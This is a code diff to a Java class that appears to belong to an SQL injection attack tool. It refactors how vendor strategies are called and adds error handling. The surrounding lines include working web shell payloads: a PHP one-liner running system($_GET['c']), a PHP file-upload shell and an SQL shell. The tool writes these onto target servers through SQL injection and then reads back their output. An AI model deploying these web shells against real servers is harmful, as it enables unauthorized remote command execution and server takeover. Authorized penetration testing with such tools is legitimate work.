@@ -181,12 +181,12 @@ public class RessourceAccessObject {
         }
 
         MediatorModel.model().inject(
-            MediatorModel.model().sqlStrategy.writeTextFile("<SQLi><?php system($_GET['c']); ?><iLQS>", path + WEBSHELL_FILENAME)
+            MediatorModel.model().currentVendor.getStrategy().writeTextFile("<SQLi><?php system($_GET['c']); ?><iLQS>", path + WEBSHELL_FILENAME)
         );
 
         String[] sourcePage = {""};
         String hexResult = new SuspendableGetRows().action(
-            MediatorModel.model().sqlStrategy.readTextFile(path + WEBSHELL_FILENAME),
+            MediatorModel.model().currentVendor.getStrategy().readTextFile(path + WEBSHELL_FILENAME),
             sourcePage,
             false,
             1,
@@ -232,12 +232,12 @@ public class RessourceAccessObject {
         String phpShell = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";
 
         MediatorModel.model().inject(
-                MediatorModel.model().sqlStrategy.writeTextFile("<SQLi>" + phpShell + "<iLQS>", path + UPLOAD_FILENAME)
+                MediatorModel.model().currentVendor.getStrategy().writeTextFile("<SQLi>" + phpShell + "<iLQS>", path + UPLOAD_FILENAME)
         );
 
         String[] sourcePage = {""};
         String hexResult = new SuspendableGetRows().action(
-            MediatorModel.model().sqlStrategy.readTextFile(path + UPLOAD_FILENAME),
+            MediatorModel.model().currentVendor.getStrategy().readTextFile(path + UPLOAD_FILENAME),
             sourcePage,
             false,
             1,
@@ -365,7 +365,7 @@ public class RessourceAccessObject {
         String[] sourcePage = {""};
 
         String hexResult = new SuspendableGetRows().action(
-            MediatorModel.model().sqlStrategy.getPrivilege(),
+            MediatorModel.model().currentVendor.getStrategy().getPrivilege(),
             sourcePage,
             false,
             1,
@@ -483,10 +483,16 @@ public class RessourceAccessObject {
             }
             reader.close();
 
-            Matcher regexSearch = Pattern.compile("<SQLi>(.*)<iLQS>", Pattern.DOTALL).matcher(pageSource);
+            Matcher regexSearch = Pattern.compile("(?s)<SQLi>(.*)<iLQS>").matcher(pageSource);
             regexSearch.find();
 
-            result = regexSearch.group(1);
+            // IllegalStateException #1544: catch incorrect execution
+            try {
+                result = regexSearch.group(1);
+            } catch (IllegalStateException err) {
+                result = "";
+                LOGGER.warn("Incorrect response from shell.");
+            }
             
             Map<String, Object> msgHeader = new HashMap<String, Object>();
             msgHeader.put("Url", url);
@@ -535,12 +541,12 @@ public class RessourceAccessObject {
                 " ?><iLQS>";
 
         MediatorModel.model().inject(
-                MediatorModel.model().sqlStrategy.writeTextFile(s, path + SQLSHELL_FILENAME)
+                MediatorModel.model().currentVendor.getStrategy().writeTextFile(s, path + SQLSHELL_FILENAME)
         );
 
         String[] sourcePage = {""};
         String hexResult = new SuspendableGetRows().action(
-            MediatorModel.model().sqlStrategy.readTextFile(path + SQLSHELL_FILENAME),
+            MediatorModel.model().currentVendor.getStrategy().readTextFile(path + SQLSHELL_FILENAME),
             sourcePage,
             false,
             1,
@@ -594,10 +600,16 @@ public class RessourceAccessObject {
             }
             reader.close();
 
-            Matcher regexSearch = Pattern.compile("<SQLi>(.*)<iLQS>", Pattern.DOTALL).matcher(pageSource);
+            Matcher regexSearch = Pattern.compile("(?s)<SQLi>(.*)<iLQS>").matcher(pageSource);
             regexSearch.find();
             
-            result = regexSearch.group(1);
+            // IllegalStateException #1544: catch incorrect execution
+            try {
+                result = regexSearch.group(1);
+            } catch (IllegalStateException err) {
+                result = "";
+                LOGGER.warn("Incorrect response from shell.");
+            }
             
             Map<String, Object> msgHeader = new HashMap<String, Object>();
             msgHeader.put("Url", url);
@@ -628,11 +640,11 @@ public class RessourceAccessObject {
         requests.setMessage("ResetInterface");
         MediatorModel.model().interact(requests);
         
+        // wait for ending of ongoing interraction between two injections
         try {
             Thread.sleep(500);
         } catch (InterruptedException e) {
-            // TODO Auto-generated catch block
-            e.printStackTrace();
+            // do nothing
         }
 
         MediatorModel.model().deleteObservers();
